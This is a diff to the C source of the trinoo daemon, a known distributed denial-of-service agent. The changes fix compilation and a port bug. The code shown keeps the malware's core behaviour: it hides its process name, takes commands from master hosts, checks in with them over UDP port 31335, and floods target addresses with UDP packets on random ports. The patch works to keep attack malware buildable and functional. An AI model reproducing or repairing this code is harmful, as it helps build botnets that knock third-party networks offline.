@@ -1,5 +1,9 @@
 /* trinoo daemon */
 
+#define _XOPEN_SOURCE 1000
+#define _BSD_SOURCE
+
+#include <arpa/inet.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,6 +14,7 @@
 #include <netinet/in_systm.h>
 #include <netinet/ip.h>
 #include <netdb.h>
+#include <time.h>
 
 /* ----------------- strfix.h ----------------- */
 #ifdef __GNUC__
@@ -48,16 +53,21 @@ char *master[] = {
 
 #define DEFSIZE 1000
 
-int main(int argc, char *argv[])
+int hello();
+int getsock();
+int sendudp(char *host, char *data, int port);
+
+int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), char **ennvp __attribute__((unused)))
 {
-	int sock, fromlen, numread, i, sock2, bewm, timerz = 120, hoe, foke;
+	int sock, numread, sock2, timerz = 120, hoe, foke;
 	struct sockaddr_in sa, from, to;
-	struct hostent *he;
+	socklen_t fromlen;
 	char buf[1024];
 	char arg1[4], *arg2, pass[10], *temp, *unf;
 	void *buf2;
-	int start, end, stop = 0, ablespoof = 0;
+	int start, end, stop = 0;
 #ifdef PROCNAME
+	int bewm;
 	for (bewm = argc - 1; bewm >= 0; bewm--)
 		memset(argv[bewm], 0, strlen(argv[bewm]));
 	strcpy(argv[0], PROCNAME);
@@ -87,7 +97,7 @@ int main(int argc, char *argv[])
 	if (foke == -1)
 		exit(-1);
 	while (1) {
-		bzero(arg1, 1024);
+		bzero(arg1, 4);
 		bzero(buf, 1024);
 		fromlen = sizeof(from);
 		if ((numread =
@@ -123,11 +133,12 @@ int main(int argc, char *argv[])
 						}
 					stop = 0;
 				}
-				if (strcmp(arg1, "bbb") == 0)
+				if (strcmp(arg1, "bbb") == 0) {
 					if (atoi(arg2) > 1000)
 						timerz = 500;
 					else
 						timerz = atoi(arg2);
+				}
 				if (strcmp(arg1, "shi") == 0)
 					hello();
 				if (strcmp(arg1, "png") == 0)
@@ -156,7 +167,10 @@ int main(int argc, char *argv[])
 							       NULL) {
 								printf("%s\n",
 								       temp);
-								to.sin_addr.s_addr = inet_addr(temp);
+								to.sin_addr.
+								    s_addr =
+								    inet_addr
+								    (temp);
 								to.sin_port =
 								    htons(rand()
 									  %
@@ -188,6 +202,7 @@ int main(int argc, char *argv[])
 			}
 		}
 	}
+	return 0;
 }
 
 int sendudp(char *host, char *data, int port)
@@ -197,7 +212,7 @@ int sendudp(char *host, char *data, int port)
 
 	out.sin_family = AF_INET;
 	out.sin_addr.s_addr = inet_addr(host);
-	out.sin_port = htons(31335);
+	out.sin_port = htons(port);
 
 	if ((unf = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
 		return -1;
@@ -213,6 +228,7 @@ int hello()
 		sendudp(master[i], "*HELLO*", 31335);
 		i++;
 	}
+	return 0;
 }
 
 int getsock()
